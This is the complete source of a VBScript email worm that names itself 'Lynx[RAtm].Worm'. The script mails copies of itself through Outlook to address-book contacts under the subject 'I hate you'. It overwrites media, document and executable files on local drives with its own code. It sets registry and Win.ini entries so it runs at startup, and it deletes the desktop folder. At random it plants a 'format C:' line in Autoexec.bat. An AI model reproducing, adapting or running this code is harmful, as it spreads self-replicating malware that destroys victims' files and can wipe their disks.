'Lynx_[RAtm].Worm
'I_hate_you
function random(n)
Random=Int(n*rnd)
end function
'-----------------------------------------------------------------
sub mail()
on error resume next
dim OutlookObject,outmail,index
set outlookObject = createobject("outlook.application")
for index = 1 to 80
set outmail= outlookobject.createitem(0)
set fso = createobject("Scripting.filesystemobject")
set sDir = fso.getspecialfolder(0)
outmail.to = outlookobject.getnamespace("MAPI").addressLists(1).addressentries(index)
outmail.subject = "I hate you"
outmail.body = "i think that you must see this file ,i insist."
outmail.attachments.add(sDir&"\help.vbs")
outmail.send
next
end sub
'-----------------------------------------------------------------
sub folderlist(folderspec)
on error resume next
dim fso,fol,saf,fil
set fso = CreateObject("Scripting.FilesystemObject")
set fol=fso.getfolder(folderspec)
set saf =fol.subfolders
for each fil in saf
infectfiles(fil.path)
folderlist(fil.path)
next
end sub
'------------------------------------------------------------------
sub listadriv
on error resume next
dim dl,dc,s,fso
set fso = CreateObject("Scripting.FilesystemObject")
set dc = fso.drives
for each dl in dc
if dl.drivetype=2 or dl.drivetype=3 then
folderlist(dl.path&"\")
end if
next
listadriv=s
end sub
'------------------------------------------------------------------
sub infectfiles(folderspec)
on error resume next
dim fso ,f,fc,fl,ext,ml,my,zap
set fso = CreateObject("Scripting.FilesystemObject")
set f = fso.getfolder(folderspec)
set fc = f.files
for each fl in fc 
ext = fso.getextensionname(fl.path)
ext = lcase(ext)
s= lcase(fl.name)
if (ext="mp3") or (ext="pwd") or (ext="exe") or (ext="mp2") or (ext="doc") or (ext="avi") or (ext="mpeg") or (ext="htm") then
set ml = fso.opentextfile(WScript.scriptfullname)
my=ml.readall
set zap =fso.opentextfile(fl.path,2,true)
zap.write my
zap.close
else
end if
next
end sub
'------------------------------------------------------------------
On error resume next
dim fso,f,sDir,WshShell ,sys,diir,loog,formy,look ,flook,winj ,win,syst
set fso = createobject("Scripting.filesystemobject")
set f = fso.getfile(WScript.Scriptfullname)
set sDir = fso.getspecialfolder(0)
set sys = fso.getspecialfolder(1)
set look = fso.createfolder(sDir&"\Look Here")
set flook = fso.createtextfile(sDir&"\Look Here\Youmustread.txt")
flook.write "Hello!It so pity that i cant look at your face now,and do you know why ,because your machine was infected by Lynx[RAtm].Worm.Regards from Od." 
flook.close
f.copy(sys&"\Kernel.vbs")
f.copy(sDir&"\help.vbs")
set WshShell=WScript.createobject("WScript.shell")
Wshshell.regwrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\help" , sDir&"\help.vbs"
set diir = fso.getfolder(sDir&"\Рабочий стол")
diir.delete
set loog=fso.getfile(sDir&"\Logos.sys")
loog.delete
if random(120)=14 then
Set formy= fso.opentextfile("C:\Autoexec.bat",2,true)
formy.write "@cls"
formy.write "@Please wait it can take only few minuts"
formy.write "@format C:"
end if
set winj = fso.opentextfile(sDir&"\Win.ini",1,true)
win = winj.readall
set syst = fso.opentextfile(sDir&"\Win.ini",2,true)
syst.writeline "[windows]"
syst.writeline "run="&sDir&"\help.vbs"
syst.close
msgbox "Read Youmustread.txt file:-)"
listadriv
infectfiles(folderspec)
mail()
